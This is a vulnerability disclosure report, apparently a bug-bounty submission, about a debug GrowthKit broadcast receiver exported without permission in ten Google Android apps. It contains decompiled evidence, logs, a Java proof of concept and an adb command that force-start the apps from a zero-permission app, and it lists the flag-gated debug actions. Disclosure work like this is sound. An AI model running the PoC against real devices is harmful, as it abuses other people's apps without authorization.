# VRP Report: GrowthKit TestingToolsBroadcastReceiver Exported in 10 Google Production Apps

## 1. Vulnerability Title
Debug/Testing Broadcast Receiver Shipped in 10 Google Production Apps — Exported Without Permission, Forces App Process Starts and GrowthKit Initialization

## 2. Affected Applications

| # | Package | App Name | VRP Tier |
|---|---------|----------|----------|
| 1 | `com.google.android.gm` | Gmail | Tier 1 |
| 2 | `com.google.android.dialer` | Google Dialer | Tier 2 |
| 3 | `com.google.android.apps.nbu.files` | Google Files | Tier 2 |
| 4 | `com.google.android.keep` | Google Keep | Tier 2 |
| 5 | `com.google.android.calendar` | Google Calendar | Tier 2 |
| 6 | `com.google.android.apps.translate` | Google Translate | Tier 2 |
| 7 | `com.google.android.apps.docs` | Google Docs | Tier 2 |
| 8 | `com.google.android.apps.tachyon` | Google Meet (Duo) | Tier 2 |
| 9 | `com.google.android.contacts` | Google Contacts | Tier 2 |
| 10 | `com.google.android.apps.fitness` | Google Fit | Tier 2 |

**Component**: `com.google.android.libraries.internal.growth.growthkit.internal.debug.TestingToolsBroadcastReceiver`
**Library**: Google internal GrowthKit library (growth promotions/tips framework)
**Device**: Pixel 6a, Android 17 (API 37), Build CP2A.260605.012

## 3. Vulnerability Type
- **CWE-489**: Active Debug Code (primary)
- **CWE-862**: Missing Authorization
- **CWE-912**: Hidden Functionality
- **Mobile VRP Category**: Debug Interface Exposure / Attack Surface

## 4. Severity Assessment
- **Impact**: MODERATE — Debug receiver in production forces app process creation, GrowthKit library initialization, and Dagger dependency injection from any zero-permission app. Debug actions (CLEAR_COUNTERS, FETCH_PROMOTIONS, ADD_PROMO, etc.) are runtime-gated by a Phenotype feature flag that is disabled in production (result=-2), but the flag is a server-side toggle that could be enabled.
- **Attack Complexity**: LOW — Single broadcast per app, no permissions required
- **User Interaction**: NONE
- **Scope**: Changed — Affects 10 Google apps simultaneously

## 5. Vulnerability Description

Google's internal `GrowthKit` library includes a `TestingToolsBroadcastReceiver` — a debug/testing broadcast receiver intended for development. This receiver is **exported with no permission requirement** and has been shipped in **10 Google production apps** on the Pixel 6a.

### 5.1 What Happens When the Broadcast Is Received

Decompilation of the receiver (from Google Translate's APK) reveals the following execution flow:

1. **App process force-start**: If the app is not running, Android creates its process to deliver the broadcast
2. **GrowthKit initialization**: `TestingToolsBroadcastReceiver.w()` triggers full GrowthKit library initialization including Dagger dependency injection
3. **Phenotype flag check**: The continuation class (`nci.java`) calls `xvf.c()` to check a Phenotype feature flag
4. **On production devices**: The flag returns `false`, the receiver logs `"Testing Feature is not enabled. Override the phenotype flag?"` and sets `resultCode = -2` — the debug action is **NOT executed**
5. **If the flag were enabled**: The receiver dispatches to `performAction()` which handles: `CLEAR_COUNTERS` (clears promotion stores), `FETCH_PROMOTIONS` (server fetch), `ADD_PROMO` (accepts Base64-encoded protobuf), `DELETE_PROMOS`, `GET_REGISTRATION_STATE` (returns FCM registration), `SYNC`, and more

### 5.2 Decompilation Evidence — Phenotype Gate

From `nci.java` (decompiled from Google Translate APK):
```
Line 84:  boolean r8 = defpackage.xvf.c()          // Phenotype flag check
Line 85:  if (r8 != 0) goto L4a                     // If flag enabled, execute action
Line 89:  "Testing Feature is not enabled. Override the phenotype flag?"
Line 91:  r9 = -2
Line 92:  r4.setResultCode(r9)                      // Set result=-2 (flag disabled)
```

**result=-2 means the feature flag is DISABLED and the debug action was NOT executed.** Only the process force-start and GrowthKit initialization occurred.

### 5.3 Actions Available If Flag Were Enabled

The `TestingToolsBroadcastReceiver` supports at least 10 debug actions:

| Action | Function | Impact |
|--------|----------|--------|
| `CLEAR_COUNTERS` | Clears clearcutEventsStore, visualElementEventsStore, cappedPromotionStore | Reset all promotion tracking |
| `FETCH_PROMOTIONS` | Forces server-side promotion fetch | Network traffic, server abuse |
| `FETCH_EVAL_RESULTS` | Forces evaluation result fetch | Network traffic |
| `ADD_PROMO` | Accepts Base64-encoded protobuf via `proto` extra, parses as `PromoProvider.GetPromosResponse.Promotion` | Inject arbitrary promotions |
| `DELETE_PROMOS` | Accepts `account` + `promo_ids` string array | Delete specific promotions |
| `GET_REGISTRATION_STATE` | Returns `fcm_registration_status`, `fcm_registered_environment`, `fetch_registration_status`, `fetch_registered_environment` | FCM registration info leak |
| `SYNC` | Forces sync operation | Network traffic |
| `STORE_PROMOTION` | Accepts `account` + `proto` extras | Store arbitrary promotion |

## 6. Proven Impact — Dynamic Evidence

### 6.1 All 10 Apps Accept Broadcasts (result=-2)

Every app was tested. All return result=-2 (flag disabled, action not executed, but receiver was invoked):

```
=== CLEAR_COUNTERS ===
com.google.android.dialer:         result=-2
com.google.android.gm:             result=-2
com.google.android.apps.nbu.files: result=-2
com.google.android.keep:           result=-2
com.google.android.calendar:       result=-2
com.google.android.apps.translate: result=-2
com.google.android.apps.docs:      result=-2
com.google.android.apps.tachyon:   result=-2
com.google.android.contacts:       result=-2
com.google.android.apps.fitness:   result=-2

=== FETCH_PROMOTIONS ===
com.google.android.dialer:         result=-2
com.google.android.gm:             result=-2
com.google.android.apps.nbu.files: result=-2
com.google.android.keep:           result=-2
com.google.android.calendar:       result=-2
com.google.android.apps.translate: result=-2
com.google.android.apps.docs:      result=-2
com.google.android.apps.tachyon:   result=-2
com.google.android.contacts:       result=-2
com.google.android.apps.fitness:   result=-2
```

**Note**: result=-2 confirms the receiver was reached and the Phenotype flag was checked. The debug action itself was NOT executed because the flag is disabled in production.

### 6.2 GrowthKit Initialization Triggered (PROVEN)

Logcat proves the debug broadcast triggers full GrowthKit initialization even though the action is gated:

```
09-06 05:41:10.942  GTR_TranslateApplication: Initializing GrowthKit...
09-06 05:41:11.129  GTR_TranslateApplication: Successfully Initialized GrowthKit!
```

### 6.3 App Process Force-Start (PROVEN)

The broadcast forces process creation for apps that weren't running — this happens before the flag check:

```
09-06 05:41:10.241  ActivityManager: Start proc 21345:com.google.android.keep for broadcast
    {com.google.android.keep/com.google.android.libraries.internal.growth.growthkit.internal.debug.TestingToolsBroadcastReceiver}
09-06 05:41:10.679  ActivityManager: Start proc 21397:com.google.android.apps.translate for broadcast
    {com.google.android.apps.translate/com.google.android.libraries.internal.growth.growthkit.internal.debug.TestingToolsBroadcastReceiver}
```

## 7. Security Concerns

### 7.1 Debug Code in Production (CWE-489)
A broadcast receiver named `TestingToolsBroadcastReceiver` in a package path containing `internal.debug` is active debug code shipped in 10 production Google apps. The receiver is exported without permission, and while the actions are currently gated by a Phenotype flag, the code to handle all debug actions is present in the production binary.

### 7.2 Phenotype Flag Is a Server-Side Toggle
The Phenotype flag (`xvf.c()`) is checked at runtime, not build time. This means:
- The debug action handling code exists in the production APK
- If the Phenotype flag were toggled server-side (e.g., via a misconfiguration, targeted rollout, or compromise of Google's Phenotype infrastructure), all 10 apps would immediately accept and execute debug commands from any zero-permission app
- The flag is a soft gate, not a hard removal — the attack surface exists but is dormant

### 7.3 App Force-Start Abuse (PROVEN — No Flag Required)
The process force-start and GrowthKit initialization occur BEFORE the flag check. A zero-permission app can:
- Force-start any of the 10 apps without user interaction
- Trigger full Dagger dependency injection and GrowthKit initialization
- Determine which apps are installed via timing side-channels
- Drain battery by repeatedly force-starting multiple apps

### 7.4 Attack Surface Expansion
The exported receiver increases the IPC attack surface of 10 apps. Even with the flag disabled:
- The receiver processes attacker-controlled Intent data
- Dagger injection runs attacker-triggered initialization code
- Any future vulnerability in the GrowthKit initialization path would be reachable from any app

## 8. Proof of Concept

```java
// Zero-permission app forces process start + GrowthKit init in 10 apps
private void triggerGrowthKitInit() {
    String[] targetApps = {
        "com.google.android.gm",
        "com.google.android.dialer",
        "com.google.android.apps.nbu.files",
        "com.google.android.keep",
        "com.google.android.calendar",
        "com.google.android.apps.translate",
        "com.google.android.apps.docs",
        "com.google.android.apps.tachyon",
        "com.google.android.contacts",
        "com.google.android.apps.fitness"
    };

    String receiver = "com.google.android.libraries.internal.growth" +
        ".growthkit.internal.debug.TestingToolsBroadcastReceiver";

    for (String pkg : targetApps) {
        Intent intent = new Intent(
            "com.google.android.libraries.internal.growth.growthkit.CLEAR_COUNTERS");
        intent.setClassName(pkg, receiver);
        sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                int result = getResultCode();
                // result=-2: flag disabled (action not executed, but process started + GrowthKit initialized)
                // result=0: action executed successfully (if flag were enabled)
                // result=-1: action failed
                Log.d("PoC", pkg + " result=" + result);
            }
        }, null, 0, null, null);
    }
}
```

**ADB Reproduction:**
```bash
# Force-start Gmail and trigger GrowthKit initialization
adb shell am broadcast \
  -n "com.google.android.gm/com.google.android.libraries.internal.growth.growthkit.internal.debug.TestingToolsBroadcastReceiver" \
  -a "com.google.android.libraries.internal.growth.growthkit.CLEAR_COUNTERS"
# Returns: Broadcast completed: result=-2
# (result=-2 = Phenotype flag disabled, action NOT executed, but process started + GrowthKit initialized)
```

## 9. Root Cause

The `TestingToolsBroadcastReceiver` is part of Google's internal `GrowthKit` library (`com.google.android.libraries.internal.growth.growthkit`). The word "internal" and "debug" in the package path confirm this is intended for internal use only. The receiver is registered in each app's AndroidManifest.xml with:
- `android:exported="true"` (implicit, due to intent-filter)
- **No `android:permission` attribute**
- Intent filters for debug actions

The debug actions are gated at runtime by a Phenotype feature flag (`xvf.c()`), but the receiver itself, its code, and its exported registration are all present in production builds. This is a build configuration issue — debug components should be completely stripped from release builds, not soft-gated by a runtime flag.

## 10. Remediation

1. **Immediate**: Remove `TestingToolsBroadcastReceiver` from production builds of all 10 apps — do not rely on Phenotype flags to gate debug functionality
2. **Short-term**: Add `android:exported="false"` or a signature-level permission to the receiver in the GrowthKit library's default manifest configuration
3. **Long-term**: Implement a build-time check in the GrowthKit library that strips debug components from release builds (similar to `debugImplementation` vs `implementation` in Gradle)
4. Audit all other Google internal libraries for similar exported debug components

## 11. Decompilation Evidence

- Decompiled source: `TestingToolsBroadcastReceiver.java` (from Google Translate APK)
- Continuation class: `nci.java` — contains the Phenotype flag check at line 84
- Flag check function: `xvf.c()` — returns false on production devices
- Log message when disabled: `"Testing Feature is not enabled. Override the phenotype flag?"`
- Result code mapping: -2 = flag disabled, 0 = action succeeded, -1 = action failed

## 12. Evidence Files
- Logcat proof: `logs/vrp_growthkit_proof_logcat.txt`
- PoC app: `poc_app/` (com.vrp.poc, zero permissions)

## 13. Test Device
- Google Pixel 6a (bluejay)
- Android 17 (API 37)
- Build CP2A.260605.012
